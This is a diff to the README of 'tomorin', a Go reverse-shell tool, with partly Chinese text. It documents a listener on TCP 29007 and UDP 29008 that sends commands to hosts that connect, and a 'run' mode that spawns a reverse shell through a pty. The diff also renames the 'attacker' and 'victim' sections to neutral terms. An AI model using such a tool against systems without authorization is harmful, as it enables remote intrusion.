@@ -6,7 +6,11 @@
 go build -o ./bin/tomorin
 ```
 
-### attacker
+## Usage
+
+### Listening host 
+
+在作为server的主机上执行 `./tomorin serve` 监听连接。当有外部主机连接上的时候，会发送一个命令。默认是 `whoami` 而且执行会 exit。
 
 ```
 ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin serve -h
@@ -23,13 +27,15 @@ Flags:
       --tcp-timeout int   Timeout for each connection. Applied to TCP only (default 10)
 ```
 
-监听 TCP 29007 和 UDP 29008 端口。当victim连接上端口的时候，发送指定的cmd然后退出。
+监听 TCP 29007 和 UDP 29008 端口
 
 ```bash
 ./bin/tomorin serve -a tcp:29007 -a udp:29008
 ```
 
-### victim
+### Target host
+
+`./tomorin run` 在目标主机上通过创建pty来执行反弹Shell。
 
 ```
 ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin run -h
@@ -68,3 +74,6 @@ samples:
 - [x] Reverse shell server
     - [x] TCP
     - [x] UDP
+- [x] Execute in pty
+- [ ] Execute in `exec.Command`
+- [ ] Check dependencies
